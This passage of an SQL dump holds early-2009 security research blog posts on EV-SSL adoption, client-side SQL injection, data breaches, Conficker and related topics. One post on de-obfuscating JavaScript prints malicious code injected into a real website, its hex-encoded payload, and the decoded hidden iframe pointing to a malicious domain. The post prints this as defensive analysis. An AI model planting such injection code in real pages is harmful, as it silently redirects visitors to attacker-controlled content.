The process I used was simple: visit each of the Alexa-listed sites (the top 50), surf around to find a \'signin\' or \'signup\' form or other equally-sensitive use of HTTPS, and then watch if the URL address bar in my Internet Explorer 7 browser turned green when SSL was utilized. A green bar meant EV-SSL; no green bar but still having a valid lock icon is standard SSL. I found that only two sites (ebay.com and login.live.com) were using EV-SSL. That\'s it. Just two. All of the other sites were using standard SSL, with the exception of ten sites that don\'t use SSL at all with their login forms (youtube.com, hi5.com, mail.ru, photobucket.com, vkontakte.ru, imageshack.us, friendster.com, skyrock.com, odnoklassniki.ru, and dailymotion.com) and two more that don\'t really receive sensitive info from the user and thus don\'t necessitate SSL (bbc.co.uk and cnn.com).    We might label that a bleak picture. Ten of the fifty top sites (20%) don\'t even use SSL for their logins. Only two use EV-SSL. I was a bit surprised to see the online retail giant, Amazon.com, didn\'t use EV-SSL. If EV-SSL was a sure-thing to lead to better customer confidence and more online retail conversions, I would have figured they would have been all over it. They would not be one to overlook a technological advantage if the ROI helped their bottom line...that is, after all, how they got started. And given that they store credit card data for quick purchasing convenience, there is a certain financial value to compromising someone\'s Amazon account; I’m surprised it hasn\'t been the target of more phishing attacks to date.    Also surprising was Yahoo (login.yahoo.com), AOL (my.screenname.aol.com), and Google (www.google.com) all use standard SSL for their common backend authentication sites. These vendors offer multiple different web services, but tie it all back to a single authentication mechanism, much like a Single Sign-On (SSO) platform. And aren\'t some of these vendors OpenID providers? That means a successful phish of a single account could be leveraged across many sites/services, even outside the realm of just these vendors. On Microsoft\'s live.com site, I found that the login form (from login.live.com, which was presented over HTTP by default but did include a link to switch to HTTPS) did go to an EV-SSL site once submitted, but the signup page (signup.live.com) was handled with a standard SSL cert. Maybe they just want to discourage new signups while assuring existing accounts it\'s safe to login.    But here\'s another thought: maybe these sites have invested in standard SSL certificates before EV-SSL was popular, and just are waiting for their current certs to expire before renewing with EV-SSL variants. That seems plausible, but the results are a bit mixed. Google renewed their current standard SSL cert in May 2008 and signup.live.com was renewed in November 2008. That was fairly recent, and definitely after EV-SSL was well established. Opposite that, AOL\'s my.screenname.aol.com certificate was issued in March 2007 and Yahoo\'s is from January 2006; it\'s arguable they were issued before EV-SSL really caught on. So it\'s hard to say, but the thought might hold true for some cases. Certainly not others.    But again, maybe I\'m still looking at it all wrong. EV-SSL might only make the most sense to certain verticals, like online banking sites. The Alexa list doesn\'t really have any bank sites in their top 50. So I did a spot-check of some big bank site URLs pulled from the top of my head. Of all the ones I tried, only BankOfAmerica\'s login site (which is separate from their normal site) used EV-SSL:                     	www.bankofamerica.com: standard SSL (renewed December 2008)  	sitekey.bankofamerica.com: EV-SSL  	www.wellsfargo.com: standard SSL (renewed June 2008)  	online.wellsfargo.com: standard SSL (renewed July 2008)  	www.chase.com: standard SSL (renewed August 2008)  	chaseonline.chase.com: standard SSL (renewed April 2008)  	online.citibank.com: standard SSL (renewed December 2007)  	www.us.hsbc.com: standard SSL (renewed July 2008)  	myonlineaccounts2.abbeynational.co.uk: standard SSL (renewed February 2009**)        That last one is very interesting. Abbey National Bank has been a notable target of phishing attempts going back a year. And yet, when they renewed their SSL certificate last week (February 12, 2009), they went with a standard certificate instead of EV-SSL. Whether they didn\'t know or didn\'t care that EV-SSL could help assure users against phishing, I don\'t know. But if a bank that\'s been phished for over a year doesn\'t decide to buy into EV-SSL when it has the convenient opportunity...who will? Marketing fluff aside, that is probably the absolute best-case realized application for EV-SSL ever. User accounts have access to monetary instruments. The site has been an active target of phishing attempts for over a year. They needed new SSL certs anyway. Any one of those reasons by itself is (supposed) ground for EV-SSL, and they had all three reasons. Oh well, maybe they\'re reconsider EV-SSL in 2010 when their new cert expires.    Until then,  - Jeff    **Postscript: it seems Abbey National Bank\'s site uses a cluster of SSL web servers that have different SSL certs installed. In some cases, I connect to a server that gives me an SSL cert that was issued on Feb 12 2009. On other occasions, I get connected to a server that gives me an SSL cert that expires on Feb 24 2009 (i.e. next week). So apparently they have currently upgraded the SSL certs on some of their servers, but not all. I just wanted to mention this in case you were poking around yourself and noticed the discrepancy. Here is a screenshot of the newer SSL cert, to prove I\'m not making stuff up:', 'Encryption', 'https://www.zscaler.com/blogs/research/ev-ssl-ssl-and-whos-not-using-it');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (595, 'Practical Example Of CsSQLi Using (Google) Gears Via XSS', 'Michael Sutton', 'February 19, 2009', 'Comment: I would like to go out of my way to thank Paymo.biz for the professionalism that they displayed in promptly responding to vulnerabilities brought to their attention to ensure that their users were protected. Within 24 hours, they had responded to my initial communication and shortly thereafter were sharing proposed protections which were then quickly implemented on production systems. Web application vendors can learn from their example.\r\n\r\nYesterday, at the Blackhat DC security conference, I spoke about the dangers of persistent web browser storage. Part of the talk focused on how emerging web browser storage solutions such as Gears (formerly Google Gears) and the Database Storage functionality included in the emerging HTML 5 specification, could be attacked on sites with existing cross-site scripting (XSS) vulnerabilities. The overall message is that while such technologies have built in controls to protect against attacks such as SQL injection (SQLi), when secure technologies are implemented on insecure sites, protections become meaningless.\r\n\r\nBoth Gears and HTML 5 Database Storage, permit web applications to store content in local relational databases, which reside on the local file system by leveraging the SQLite database format. This provides powerful functionality as web applications can now be taken offline as was recently done with Gmail. At the same time, it adds a new attack vector as persistent data can now potentially be attacked on the desktop, not just the server. Given that we\'re dealing with a relational database, is client-side SQL injection (csSQLi) possible? Unfortunately, the answer is yes and it\'s not simply a theoretical attack, it\'s very practical thanks to the significant prevalence of XSS vulnerabilities.\r\n\r\nBoth Gears and HTML 5 Database Storage leverage client-side JavaScript to create and interact with local databases. Therefore, if an XSS vulnerability is present, it\'s all too easy for an attacker to compromise the confidentiality and integrity of locally stored data by reading from or writing to the local database. Web applications with local databases via HTML 5 are presently rare due to the fact that only WebKit based browsers have implemented the functionality (i.e. Safari). This however seems poised to change with recent announcements that offline Gmail access is being developed for the iPhone and Android based phones via HTML 5 Database storage. Gears enabled applications on the other hand have already started to spring up and csSQLi has therefore become a reality.\r\n\r\nPaymo.biz, a time tracking application was previously vulnerable to csSQLi due to the existence of XSS vulnerabilities on the site. The associated image details how JavaScript could be injected to read from the local database and in this proof of concept simply write the data to an alert box. Step #1 is specific to this situation as the XSS injection point occurs within paragraph tags which need to be closed. Gears is a JavaScript API, so in step #2, the API is included in order to expose necessary functions. In step #3, the local database is opened. In traditional (server side) SQLi the database structure must first be determined either through error messages or other brute force means. With csSQLi this is not a challenge since the database structure is exposed. To determine the names of tables, columns, etc. an attacker simply needs to first access the application himself to establish a local copy of the database on his own machine. Executing the SQL statement is conducted in step #4 and once again csSQLi is far less challenging than a server-side SQLi attack. Thanks to having XSS facilitate the attack, the SQL command can be composed from scratch - no need to inject commands into the middle of an preexisting SQL statement. The results of this particular injection can be seen in the associated screen shot which simply displays default data from a newly configured database.\r\n\r\nWhile Gears has not yet been widely adopted, I expect this to change in the coming months, especially with the exposure that the technology will receive thanks to recent integration with Gmail. As users recognize the power of being able to take web applications offline, developers are sure to investigate adding Gears to their own applications. It\'s important to note that this attack has nothing to do with insecurities within the Gears technology itself. As mentioned, the attack is made possible when Gears is implemented on a site with existing XSS vulnerabilities. Unfortunately, XSS is a vulnerability which is far too prevalent on the web today. As such, it is inevitable that we\'ll see sites vulnerable to csSQLi. I hope that this early example illustrates the risks associated with offline browser storage and the importance of ensuring overall application security before adding this powerful functionality. Don\'t avoid Gears...embrace it...but do so securely.\r\n\r\nA full copy of the slides from my talk entitled A Wolf in Sheep\'s Clothing - The Dangers of Persistent Web Browser Storage is available here.\r\n\r\n- michael', 'Abuse', 'https://www.zscaler.com/blogs/research/practical-example-cssqli-using-google-gears-xss');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (596, 'Rough Week For Security Companies', 'Michael Sutton', 'February 13, 2009', 'It\'s been a rough week for security companies, especially for their web masters. A Romanian hacking group decided to embarrass as many as possible by identifying SQL injection (SQLi) flaws in public facing websites and Kaspersky, F-Secure and Bit-Defender (actually a reseller) all fell victim to the attacks. Now SQLi is far from a new issue and it\'s widely accepted that pre-auth SQLi vulnerabilities are critical flaws that require immediate attention. Despite this, we see no shortage of SQLi and it is increasingly becoming a favorite tool for botnet authors, who use such vulnerabilities to inject content into otherwise legitimate web pages in order to redirect browser traffic. I recently commented on the volume of such attacks that we\'re seeing and stepped through a specific example.    I spend most of my time worrying about emerging threats - the risks that we\'ll face in the months and years ahead. However, from a business perspective, greater damage comes from current, widespread attacks and companies rightly so, dedicate the majority of security resources to combating the \'clear and present danger\' which they face. The events of this past week caused to to ponder how we\'re doing as an industry in combating what is now a mature and well understood vulnerability - SQLi.    Unfortunately, web application security statistics are somewhat hard to come by. The best come from Whitehat Security, which generally publishes an overview of what they\'re seeing from scanning client websites. They publish these reports a couple of times a year, so I dug up all of their statistics dating back to November 2006. Sadly, as can be seen is the Whitehat chart, progress appears to be relatively flat. The Whitehat statistics shed light on the likelihood that a particular vulnerability will exist on a given website which they review. We can see that over the past 2+ years, on average, their is a 17 1/3% likelihood of discovering a SQLi vulnerability on any given site. That\'s truly frightening and while it helps to explain why such vulnerabilities are so prevalent, it doesn\'t explain why they aren\'t going away.    I also pulled statistics from a 2007 survey conducted by the Web Application Security Consortium. These statistics provide a consolidated view from eight separate security services vendors. This time around, we see that approximately 1/4 of sites scanned revealed SQLi vulnerabilities - even worse.    The question we need to ask ourselves is why are the statistics not improving? In my opinion, while the security industry is getting better at detecting and patching such issues and businesses are better understanding the risks associated with mature vulnerabilities such as SQLi, the population of new developers and web applications is growing at an even faster pace. Who is a web application developer today? Thanks to point and click tools, just about anyone can be a web application developer - but that doesn\'t mean that they\'re a good developer or one that understands and implements secure coding practices. We\'ve struggled for a long time to educate developers about security and while such initiatives are important, they will never be enough. Education alone will never succeed in dropping the statistics included in this blog because the vast majority of \'developers\' will never receive such training. The majority of developers don\'t have a Computer Science degree and they may not even get paid to develop. As such, vulnerability statistics will only begin to drop once protections are built into the architectures of the \'point and click\' development tools, implementing security by default. Fortunately, we have started to see vendors take such steps. Only when the \'every man\' developer can be protected from attack, without security knowledge will we truly see a drop in vulnerability statistics.    - michael', 'Abuse', 'https://www.zscaler.com/blogs/research/rough-week-security-companies');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (597, 'What Did You Do On Data Privacy Day?', 'ThreatLabz', 'January 29, 2009', 'January 28th is officially international Data Privacy Day. Apparently this was established in 2008 to raise awareness for data privacy issues, provide education (particularly to teenagers) regarding data privacy concerns, etc. Did you even know about it? Don\'t worry, neither did I. Maybe we need an awareness campaign to educate people that there is an awareness campaign to educate people (heh). Intel has some various online links and material related to the happenings of Data Privacy Day.    Anyways, while educating users to not hand out their personal details is a good thing, the bulk of concerning data privacy breaches have been largely caused by large corporations mishandling user data. Whether it\'s AOL, Choicepoint, or Heartland, educating a user to keep their data private is irrelevant if a \'trusted\' third-party data keeper is just going to expose it on their behalf. Thus I\'m not sure why we are trumpeting to solve privacy at the end user level with new \'privacy enhancing technologies\' (PETs) when bigger data privacy and exposure problems exist upstream. P3P headers, anonymizers, and cookie removers are not going to affect things like the Veteran Affairs leak from happening. Even if I\'m tight-lipped about my personal details, my service provider might not be. Or the person my service provider outsources to might not be. Or the person that person outsources to might not be. You get the point.    I\'m sure there are some in the crowd that are thinking \"PCI will help with data privacy exposure issues in third-parties.\" Well, kind of. Just look at Heartland--they were PCI-compliant. Which brings to an interesting point: compliance != security. PCI can potentially ferret out gross negligence, but catching all the low-hanging fruit doesn\'t prevent someone from going a little higher up the tree. Especially if they are hungry.    Until next time,  - Jeff', 'Data Breach', 'https://www.zscaler.com/blogs/research/what-did-you-do-data-privacy-day');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (598, 'Stepping Through JavaScript Obfuscation', 'Michael Sutton', 'January 28, 2009', 'I\'ve been noticing an increasing number of attacks whereby malicious IFRAMEs are injected into the pages of otherwise reputable sites. While such activity is often very obvious as you can spot an IFRAME right before the closing tag, attackers with a little more skill generally attempt to obfuscate the injected code. Depending upon the level of creativity, JavaScript obfuscation may barely be noticeable as code at all and researchers often shy away from de-obfuscating it. The reality is that JavaScript runs within your browser, so you can always figure out what it\'s doing, it just takes a little extra effort. Now you can generally streamline the process by employing tools such as a JavaScript debugger or by inspecting web traffic, but I\'d like to take the old fashioned approach of understanding the code to illustrate that obfuscation is generally not as challenging as it may first appear.    When reviewing our weblogs recently I came across a perfect example of the aforementioned scenario. The Virginia Jyothi Institute of Management website appears to be a perfectly reputable site...except for an interesting snippet of JavaScript at the bottom of the page.    Obfuscated JavaScript:      function C7D36720260A79BEECF3B8D6D(C78D9ED077610F5E11)  {function E69961B4A47426004A21A064DA3(){return 16;}  return(parseInt(C78D9ED077610F5E11,E69961B4A47426004A21A064DA3()));}  function DB47FCE800845F2179C(D89D6EB726D3262DEA5){function  CF7A2398A7A3B02EEF51A624DC28F2(){return 2;}var B0A173316D010072=\"\";  for(D6BE4D56711AC9FE592=0;D6BE4D56711AC9FE592    Ouch! That\'s ugly. At first glance it looks like a jumble of random numbers with a sprinkling of English. However, upon further inspection you can clearly see JavaScript functions (e.g. String.fromCharCode()) and basic syntax, such as a for loop. In reality, it\'s not really ugly at all, but like a freshman dorm room, it does need a little cleanup. Let\'s do three things:    1.) Replace function/variable names - You\'ll notice that the seemingly random numbers are strings that show up more than once. That\'s because they\'re not random at all, they\'re just function and variable names that aren\'t particularly easy on the eyes. Start by replacing these painful names with simple letters.    2.) Add white space - obfuscation generally involves removing white space and cramming everything together, so add it back. Follow they JavaScript syntax but expand it to a common format that you\'re comfortable with.    3.) Rearrange - So long as you don\'t change the logic flow, move things around, once again, to an arrangement that is more comfortable.    Once we make these changes, we have much more manageable code. As they say, let\'s put some lipstick on that pig...    The same function cleaned up:      D(\"3C696672616D65207372633D22687474703A2F2F6D6F6E6579  323030382E6F72672F746D702F222077696474683D31206865696  768743D31207374796C653D227669736962696C6974793A686964  64656E3B706F736974696F6E3A6162736F6C757465223E3C2F696  672616D653E\");    function A(B)  {    function C()    {      return 16;    }    return(parseInt(B,C()));  }    function D(F)  {    function G()    {      return 2;    }    var H=\"\";    for(E=0;E    {      H+=(String.fromCharCode(A(F.substr(E,G()))));    }    document.write(H);  }    Wow, what a huge improvement. Now that\'s something that I can deal with. It still may seem a bit verbose for what it\'s trying to accomplish, but let\'s walk through it one step at a time.      	We start of by sending a large string of data to D().  	Within D(), let\'s look at the for loop. It\'s iterating over the data two characters at a time (G() returns 2).  	Each pair of characters are sent to A() where they are converted from base 16, which tells us that they\'re hexadecimal values.  	Once converted, the integers are then fed to String.fromCharCode(), which is essentially an automated ASCII table, converting decimal values to letters.  	The entire string is iterated over until each hexadecimal pair is converted to a letter.      When done, the converted string is revealed:    <iframe src=\"http://money2008.org/tmp/\" style=\"visibility: hidden; position: absolute;\" height=\"1\" width=\"1\"></iframe>    Now there are many easier ways to come to the same conclusion. You could walk through the JavasScript using a debugger or in this case, once you realized that the seemingly random string was likely a hexadecimal encoding, just run it through an ASCII to Hex converter. However, hopefully this walk through has shed light on the fact that JavaScript obfuscation, while one more step in the process, isn\'t generally much of a hurdle to overcome.    - michael', 'Obfuscation', 'https://www.zscaler.com/blogs/research/stepping-through-javascript-obfuscation');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (599, 'EV-SSL\'s Reported Successes, Maybe', 'ThreatLabz', 'January 23, 2009', 'In a previous post I included a blurb mentioning that Verisign reported 7000 EV-SSL certificates were issued in the past two years, which seems fairly low. Recently I was referred to a spot on Verisign’s website where they keep their SSL case studies. Many of their more recently posted studies indicate the positive benefit/increased conversions brought about by using EV-SSL certificates. In other words, switching from standard SSL to EV-SSL certs lead to more sales, all because of customer confidence in seeing the \'green bar\'.    For some reason, a mental warning alarm was going off in the back of my head. So I decided to dig deeper into the case studies to see how they actually tested things. After all, a flawed test methodology results in questionable results. I\'m a bit of a stickler when it comes to having a solid, repeatable methodology for testing stuff.    In an ideal world, these case studies would have been conducted by subjecting half of their web clients to a standard SSL certificate, and the other half to an EV-SSL certificate. Easier said than done, but I suppose it\'s possible if you had a web server farm where half of the servers had the EV-SSL cert loaded and the other half didn\'t, and you used a network load balancer in front of everything to persistently keep the same client/source IP address connection mapped to the same server in the farm. You couldn\'t use an application level load balancer because that would require terminating the SSL to see the application-layer data, and you wouldn\'t know to terminate with EV-SSL vs. standard SSL. A completely wrong methodology would be see how many sales you got using the standard SSL certificate, then see how many you got after you upgraded to EV-SSL, and attribute the change to just the EV-SSL certificate. There are too many other factors that could affect a change in sales, such as a slow-down in the economy, a wave of released stimulus checks, a newly-launched advertising campaign, etc.    So how did they test? In the few case studies I read, they simply separated traffic into EV-SSL capable browsers (Internet Explorer 7, Firefox 3) vs. non-EV-SSL capable browsers (Internet Explorer 6, Firefox 2). The idea is that the non-EV-SSL browsers were not showing the green bar, while the EV-SSL browsers were. Then they measured the conversion rate of these two groups, and of course, the EV-SSL browser group had higher conversions. So it must have been the green bar. Or was it?    The core problem with this approach is that the population representation is skewed. The methodology assumes that users of IE7 are no different than users of IE6, which is not the case. The web development community is already largely aware that a significant portion of the remaining IE6 hold-outs (i.e. those who have not upgraded to IE7) are actually corporate users that are running on systems that are not allowed to be upgraded. Think about it: a notable number of home users will leverage Window\'s standard automatic update feature, and that would have updated them to IE7 long ago. Corporate environments, on the other hand, control the updates and look to have consistent version deployments across desktops. Further, they have a significant investment in web applications tailored to work with IE6 (which has been out for 7 years now...so that\'s 7 years of web apps that were made just for it); if the choice is to update all internal web apps to work with IE7, or just keep the corporate desktops at IE6, well, the fiscal choice is obvious.    Thus let\'s frame this scenario a bit differently: given visitors to a non-business-centric retail shopping web site, who is more likely to buy something...people shopping from their home computer, or people shopping from their work computer? Would you normally be tempted to buy a new pair of shoes online using your corporate workstation on your lunch break? Would you perhaps search a little to figure out what you wanted (which seems like an innocent-enough use of the corporate network), and then finish the transaction (i.e. officially make the purchase) later that evening when you got home?    Therefore my biggest complaint about the EV-SSL testing methodology that these case studies use is that the non-EV-SSL browser group (particularly IE6 users) will statistically have more coming-from-their-corporate-workstation users in it, and I\'m not convinced that such users are identical to other users in regards to their immediate willingness to make personal retail or pharmaceutical purchases. Personally, I would expect those corporate users to be less-likely to lead to an immediate retail conversion. And that\'s what the EV-SSL case studies all seem to say/support...but they attribute that phenomenon to the presence or absence of the EV-SSL certificate.    So does that mean EV-SSL is responsible for the higher conversion rate? Not necessarily. Does it mean it\'s not responsible? Well, not necessarily. To know for sure, all other variables must be approximately equal...and in these situations, there are too many differing factors between the two groups to know in particular which factor is having the most impact. To help put things in perspective, it would be nice to see the same metrics (i.e. conversion rates for IE7 vs IE6 users) reported for sizable retail sites that are not using EV-SSL certificates. I have a hunch that, even without EV-SSL, those sites will still see slightly higher conversion rates for IE7 users compared to IE6 users.    Until next time,  - Jeff', 'Encryption', 'https://www.zscaler.com/blogs/research/ev-ssls-reported-successes-maybe');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (600, 'Heartland Payment Systems Joins A Crowded Club', 'Michael Sutton', 'January 22, 2009', 'This week Heartland Payment Systems confessed to what may ultimately be the largest data breach ever, with some suggesting that as many as 100 million credit cards have been exposed. This makes the 2007 TJ Maxx breach of 45 million debit and credit cards look fairly reasonable. To make matters worse for Heartland, their PR department apparently felt they they could sweep the item under the rug with some shameless tactics such as announcing the breach on inauguration day and registering the domain name 2008breach.com to discuss the matter. The latter appears to be an effort to distance the information from the Heartland corporate name and make it appear to be a dated issue.    What frightens me about such issues is not the earth shattering numbers that make the headlines for a single breach but the fact that for every Heartland, there are hundreds if not thousands of data breaches that go relatively unnoticed. In a past role, I was involved in a customer round table to discuss security, which attracted CISOs from a variety of large companies. During a discussion on data loss, talk turned to unintentional loses such as \'losing a tape off the back of the truck\'. A CISO from a major financial institution shook his head and said \"if only you knew how common that is\". I have no doubt that he was being frighteningly honest with that statement and in a world where access to a few simple details such as my SSN could ruin me financially, that is truly a sobering thought.    The Open Security Foundation does an excellent job of trying to ensure that data breaches don\'t go unnoticed, by maintaining the Data Loss DB. It is a well maintained, detailed, open source collection of data and statistics regarding data loss dating back to 2000. When Heartland came forward, I decided to look back at the past year to see just how severe a problem this has become.      	The Data Loss DB contains records for 479 incidents of data loss during 2008  	Records exist to suggest that at least 83,350,024 accounts were affected in 2008, however, estimates of the numbers of accounts affected were not available for 26% of incidents, so the actual number is higher  	Stolen laptops accounted for the majority of the data loss at 20% of all incidents, while hacks of some description accounted for 17% of incidents and web specific hacks were responsible for 14% of the results  	Social Security Numbers were lost in one third of all attacks last year      Besides being thoroughly depressing, these statistics should teach us a few things. First and foremost, while the Heartlands of the world will capture the headlines, they represent only the tip of the iceberg in terms of the loses that occur every day. Moreover, data loss occurs in a multitude of ways, both through direct attacks and carelessness on the part of employees. The important thing is that companies have both preventive and detective controls in place to ensure that such incidents are stopped in the first place but also identified when they do occur. If you wait to see your company in the headlines and you\'re in charge of enterprise security, two things are certain - like Kato Kaelin, you\'ll be famous and unemployed.    - michael    [Charts courtesy of the Open Security Foundation]', 'Analysis', 'https://www.zscaler.com/blogs/research/heartland-payment-systems-joins-crowded-club');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (601, 'SANS/CWE Top 25 Programming Errors', 'ThreatLabz', 'January 19, 2009', 'Recently Mitre and SANS teamed up to produce a list of the top 25 security errors that programmers should focus on. The errors were selected from the Common Weakness Enumeration (CWE) collection, which looks to enumerate all the different ways a piece of software can create a security vulnerability. For those familiar with CVE (Common Vulnerabilities and Exposures), the difference between CVE and CWE is the former tracks point instances of vulnerabilities in specific applications, while the latter tracks the different ways a vulnerability can manifest in any arbitrary application.\r\n\r\nThe list does cover the gamut of heavy-hitting vulnerability types that traditionally plague applications (SQL injection, XSS, command injection, buffer overflows, file name manipulation, sending data in the clear or with weak crypto, etc.), but nothing on it is particularly earth-shattering. I always chuckle to myself when I see entries like CWE-20 (Improper input validation) and CWE-116 (Improper output validation) as they are a bit of a catch-all and, from some viewpoints, subsume all of the more specific input/output validation errors such as SQL injection, XSS, etc. A programming shop that validated all of their incoming data would likely be able to cross multiple items off the list...but it\'s actually a fairly tall task. I\'ve dealt with many application audits and security code reviews in my past, and I\'ve never encountered a programming shop who felt it was realistic to go back and audit/adjust all inputs for validation on a moderate sized app (or larger). These large applications—many being web-based—sourced data from too many places to feasibly and accurately account for them all. Which goes along with something me and many other security professionals have always said: it is easier to design security in, rather than retrofit it after-the-fact. Having and mandating the use of a core set of available global validation functions will (hopefully) keep programmers tagging inputs with a base level of validation as the application grows and sprawls. Once a large application is written, trying to find and evaluate all inputs is like trying to find needles in a haystack. In my experience, most organizations change tactics at that point and look to just ensure they are not vulnerable to specific errors. In other words, rather than ensure all inputs are validated, they will instead just review the areas around their SQL calls to ensure there are no SQL injection issues. This essentially employs validation at \'time of use\' rather than \'time of reception.\' On the surface this seems like a good strategy--after all, there are likely few times of use for any given input that could result in a security vulnerability. But the long-term problem with his approach is that it creates a patchwork effect where validation is not done consistently. If input validation is done at point A (immediately up receiving), then all subsequent uses of that data (i.e. points B, C, and D) are in the clear. But if you instead employ validation at point D (i.e. time of use), then you\'re OK for now...until a programmer decides to branch C to call point E. At that point, E will inherit dirty data, but the programmer might not suspect it because they were mentally complacent with the idea that the data was previously clean at point D. Any direct or derived uses of the data at points A, B, C will still be susceptible to vulnerability.\r\n\r\nBut input validation aside, let\'s look at the list as a whole. It\'s meant for application developers, and addresses programming issues. These are definitely worth fixing, but at the same time, they can only go so far; in particular, this list does not address operational security issues. Here are some examples of security incidents that the list would not address:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	High-profile Twitter accounts were compromised due to an admin Twitter account having an easily-guessed password\r\n	 \r\n	In-session phishing has malicious sites showing fake session expiration popups to users, encouraging them to supply login credentials to re-login\r\n	 \r\n	30 million AOL account records were sold to spammers by an internal AOL employee\r\n	 \r\n	Spammers are still regularly abusing any open SMTP relay found on the Internet; open HTTP proxies are no better off\r\n	 \r\n	Laptops (and backup tapes) containing confidential records are being stolen at what now seems like regular intervals; the largest to date was US Veteran Affairs, having 26.5 million records compromised\r\n	 \r\n	Part of the CardSystems fiasco involved having unencrypted copies of consumer data laying around for \'test/research purposes\'\r\n	 \r\n	Consumer gadgets are now shipping with viruses/malware (Samsung digital photo frames, ASUS Eee Box PC, TomTom navigator, etc.)\r\n\r\n\r\nOverall the CWE/SANS list effort is good, because everyone could definitely benefit from a higher level of security in application software. But a look at the recent high-profile security incidents shows that humans are still a very real and very weak link in the security chain. So it\'s important to keep the list in perspective; even if you tackle all 25 items on the list, you may still be exposed by weak operational practices, user oversights, or what would have been item 26 on the list. It is worth noting that SANS also has a broader Top 20 Security Risks list, which does encompass a lot of operational security issues.\r\nUpdate: also check out the How to suck at Information Security list, also posted at SANS.\r\n\r\n- Jeff', 'Vulnerability', 'https://www.zscaler.com/blogs/research/sanscwe-top-25-programming-errors');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (602, 'Why Is Conficker/Downadup Succeeding?', 'Michael Sutton', 'January 18, 2009', 'It has been a while since we\'ve seen a fast spreading worm affect a significant volume of victims. This past week however a new variant of Conficker (aka Downadup) reportedly infected millions of Windows machines. So called \'big bang\' worms have largely faded from the headlines not so much for technical reasons but rather for both procedural and motivational reasons. On the procedural front, we\'ve shortened patch cycles and locked down external access to/from networks. From a motivational standpoint, attackers have decided that \'big bang\' worms don\'t meet their needs. Attackers have real financial motivations and drawing media attention to their efforts is not generally conducive to increasing revenue. Attacks have tended to be increasingly stealthy in nature. Why then has Conficker suddenly been so successful? Not surprisingly, the answer relates to weaknesses in enterprise defenses and ingenuity on the part of the attackers.    Enterprise Defenses    Patch Management - It would appear that patch cycles aren\'t so foolproof after all or at least there are still adequate numbers of end users that are not patching machines in a timely fashion. Conficker uses a vulnerability (MS08-067) that was patched nearly three months ago as its primary attack vector. Now a significant potion of unpatched machines may represent home as opposed to enterprise users but if you\'re looking for willing zombies with broadband connections, there\'s no need to be picky. Some are using the success of Conficker to call for mandatory patching.    Network Shares - Should vulnerability exploitation not succeed, Conficker then looks for network shares with weak passwords. While enterprises have significantly locked down the network perimeter over the years, the LAN itself is typically wide open. End users are freely permitted to open network shares and password strength is not enforced. Companies need to realize that it takes only one infected machine to infect an entire network. When the majority of computers are laptops that leave the corporate fortress regularly, having a single infected machine is almost a given.    Attack Techniques    Multi-faceted - Conficker is a hard working worm. It attempts to exploit machines vulnerable to MS08-067, spread via network shares and even connected removable storage devices. While leveraging multiple attack vectors is not a new technique for malware writers, Conficker\'s authors were wise to choose paths covering a lot of ground. Rather than just hammering away at a list of known vulnerabilities which are likely all exposed or all patched, Conficker instead tries exploitation, brute force and piggybacking.    Dynamic Domain Names - Once infected, Conficker attempts to contact other attacker controlled machines in order to retrieve additional code. Rather than simply using a round robin of hard coded domain names or IP addresses, Conficker instead has the ability to contact thousands of potential domain names. Those controlling Conficker can use only specific names and ignore others. Taking down all of the domain names would be time consuming and in most cases a waste of time as they may never be used.    Is Conficker an anomaly or a sign of things to come. While I don\'t expect to see a resurgence of \'big bang\' worms, I do expect malcode authors to learn from the successes of Conficker. In the meantime, grab the latest copy of the Microsoft Malicious Software Removal Tool to ensure that you\'re not infected.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/why-confickerdownadup-succeeding');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (603, '2009 Web Security Predictions', 'Michael Sutton', 'January 06, 2009', '2009 is a year when some fundamental shifts in web technology will begin to take hold and attackers will adjust accordingly. With the emergence of revolutionary changes such as cloud computing, widespread adoption of next generation web application technologies and the ‘real’ web arriving on mobile devices, we must anticipate that attackers will adjust their tactics to leverage these shifts. From a corporate perspective, anticipating attack and business trends can make the difference between being prepared for an emerging threat or being blind-sided by a new attack. We have combined the wealth of knowledge shared among Zscaler researchers with our unique access to web traffic to assemble our top 10 web security predictions for the coming year.    1.) Cloud Computing Is Ready For Primetime    2008 was the year in which \'cloud computing\' truly emerged on the public stage and gained acceptance as a force to be reckoned with. In the coming year the honeymoon period is over and it\'s time for cloud computing to prove it\'s worth. Now we’re obviously biased but I fully expect 2009 to be a critical year for security in the cloud. We\'ve moved past peaked curiosity to detailed evaluations and bake-offs of the many competing solutions that are beginning to emerge. This is the year where the pretenders will quickly be relegated to the sidelines and by year-end dominant players will begin to emerge.    For this process to occur, companies are going to need to define criteria for assessing security in the cloud. It will require a different approach than traditional software assessments, as you don\'t get to hold and touch SaaS solutions. This in turn makes it even more important that evaluators hold SaaS vendor\'s feet to the fire. Just because a vendor says that a feature exists - ensure that you understand how and determine if it will meet your needs.    2.) The ‘Mobile Web’ Is No Longer A Separate Platform    Check historical security predictions and you\'ll see that every year for the past decade was labeled as the moment when mobile malware would explode. It made sense. After all more and more people were leveraging mobile devices so attackers needed to adjust their focus eventually...yet they didn\'t. The number of large-scale attacks on mobile devices has been minimal. How can this be and will 2009 be any different?    Mobile malware has largely remained on the sidelines for two reasons. First, the multitude of platforms has limited the payback from putting in the work to exploit vulnerabilities in a single implementation. Secondly, mobile applications have largely lacked the feature set of their desktop counterparts, which leads to limited use.    Thanks in part to the competitive innovation injected by Apple\'s iPhone, the ‘mobile web’ is no longer a separate platform. What do we mean by that? There is no longer a clear distinction between web content for mobile and traditional browsers. You don\'t need WAP, WML, etc. to access the web on your phone. Standard web applications are now realistically accessible despite the limited screen real estate on a mobile device.    What does this mean for mobile attacks? It means that 2009 will 